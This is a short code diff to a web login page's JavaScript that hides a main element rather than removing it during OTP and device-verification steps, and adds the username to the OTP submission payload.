@@ -253,7 +253,7 @@
                         )
                 }
                 if (data.otp_request) {
-                    $("#main").remove()
+                    $("#main").hide()
                     $("#footer").remove()
                     $("#verify_device").addClass('hidden')
                     $("#verify_otp").removeClass('hidden')
@@ -266,7 +266,7 @@
                         ).attr('disabled', false)
                 }
                 if (data.another_device_verify) {
-                    $("#main").remove()
+                    $("#main").hide()
                     $("#footer").remove()
                     $("#verify_device").removeClass('hidden')
                     $("#verify_otp").addClass('hidden')
@@ -345,12 +345,14 @@
             e.preventDefault();
             otp = $(this).find('input[type=text]').val()
             btn = $(this).find('button[type=submit]')
+            const username = $("#user").val()
             warning = $("#warning_otp")
             warning.hide()
             const dataToSend = {
                 'info': '{{ $info }}',
                 'ac': 'o',
-                'otp': otp
+                'otp': otp,
+                'username': username
             }
             if (!otp || otp.length > 8) {
                 warning.show()
